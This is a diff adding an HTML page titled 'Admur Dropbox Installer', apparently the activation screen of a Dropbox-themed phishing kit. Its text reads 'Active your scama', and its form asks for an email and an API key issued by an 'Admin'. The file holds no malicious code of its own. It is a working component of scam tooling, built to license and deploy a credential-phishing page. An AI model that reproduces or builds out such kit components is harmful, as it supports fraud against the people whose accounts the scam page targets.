@@ -1,0 +1,59 @@
+<html>
+    <head>
+        <title>Admur Dropbox Installer</title>
+        <style>
+            body{
+                position: fixed;
+                width: 100%;
+                background: url("https://github.com/admurkits/jssx/blob/master/asd.jpg?raw=true");
+                background-size: cover;
+            }.lo{
+                position: fixed;
+                top: 20%;
+                background-color: rgba(3, 1, 1, .3);
+                left: 50%;
+                transform: translate(-50%, 0);
+                text-align: center;
+                height: 50%;
+                width: 40%;
+                background-color: black;
+            }.ok{
+                color: green;
+                border: 3px solid green;
+                background-color: black;
+                width: 50%;
+            }.ex{
+                background-color: black;
+                color: green;
+                border-bottom: 1px solid green;
+            }span{
+                color: red;
+                font-size: small;
+            }.txt{
+                color: green;
+            }.sub{
+                background-color: black;
+                color: green;
+                border: 1px solid green;
+                height: 30px;
+                width: 20%;
+            }
+        </style>
+    </head>
+    <body>
+        <div class="lo">
+            <div class="ex">
+                <h1 class="admur">Admur <br></h1><p>Active your scama <br><span>If you didn't have API key contact the Admin</span></p>
+            </div>
+            <div>
+                <form action="" method="get">
+                    <p class="txt">EMAIL</p>
+                    <input class="ok" type="email" name="szkws" id="">
+                    <p class="txt">API KEY</p>
+                    <input class="ok" type="text" name="llkq" id=""><br>
+                    <input type="submit" class="sub" value="NEXT">
+                </form>
+            </div>
+        </div>
+    </body>
+</html>
